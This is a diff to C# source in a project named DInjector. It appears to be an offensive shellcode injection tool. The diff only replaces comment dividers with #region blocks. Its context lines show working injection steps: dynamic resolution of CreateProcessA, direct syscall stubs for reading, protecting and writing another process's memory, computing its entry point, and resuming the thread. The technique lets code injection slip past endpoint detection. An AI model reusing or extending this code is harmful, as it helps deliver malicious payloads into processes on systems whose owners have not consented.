@@ -61,7 +61,7 @@ namespace DInjector
         {
             var shellcode = shellcodeBytes;
 
-            // -- CreateProcessA -------------------------------------------------
+            #region CreateProcessA
 
             IntPtr pointer = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateProcessA");
             CreateProcess dCreateProcess = (CreateProcess)Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateProcess));
@@ -90,7 +90,9 @@ namespace DInjector
                 Console.WriteLine("(Module) [-] CreateProcess");
             }
 
-            // -- NtQueryInformationProcess --------------------------------------
+            #endregion
+
+            #region NtQueryInformationProcess
 
             IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtQueryInformationProcess");
             NtQueryInformationProcess sysNtQueryInformationProcess = (NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtQueryInformationProcess));
@@ -117,7 +119,9 @@ namespace DInjector
                 Console.WriteLine($"(Module) [-] NtAllocateVirtualMemory: {ntstatus}");
             }
 
-            // -- NtReadVirtualMemory --------------------------------------------
+            #endregion
+
+            #region NtReadVirtualMemory
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtReadVirtualMemory");
             NtReadVirtualMemory sysNtReadVirtualMemory = (NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtReadVirtualMemory));
@@ -183,7 +187,9 @@ namespace DInjector
             // Absolute address of the executable EntryPoint: ENTRYPOINT_ADDR = BASE_ADDR + ENTRYPOINT_RVA
             IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);
 
-            // -- NtProtectVirtualMemory -----------------------------------------
+            #endregion
+
+            #region NtProtectVirtualMemory
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
             NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
@@ -208,7 +214,9 @@ namespace DInjector
                 Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
             }
 
-            // -- NtWriteVirtualMemory -------------------------------------------
+            #endregion
+
+            #region NtWriteVirtualMemory
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
             NtWriteVirtualMemory sysNtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));
@@ -235,7 +243,9 @@ namespace DInjector
                 Console.WriteLine($"(Module) [-] NtWriteVirtualMemory: {ntstatus}");
             }
 
-            // -- NtProtectVirtualMemory -----------------------------------------
+            #endregion
+
+            #region NtProtectVirtualMemory
 
             uint tmpProtect = 0;
 
@@ -255,7 +265,9 @@ namespace DInjector
                 Console.WriteLine($"(Module) [-] NtProtectVirtualMemory: {ntstatus}");
             }
 
-            // -- NtResumeThread -------------------------------------------------
+            #endregion
+
+            #region NtResumeThread
 
             stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtResumeThread");
             NtResumeThread sysNtResumeThread = (NtResumeThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtResumeThread));
@@ -274,6 +286,8 @@ namespace DInjector
             {
                 Console.WriteLine($"(Module) [-] NtResumeThread: {ntstatus}");
             }
+
+            #endregion
         }
     }
 }
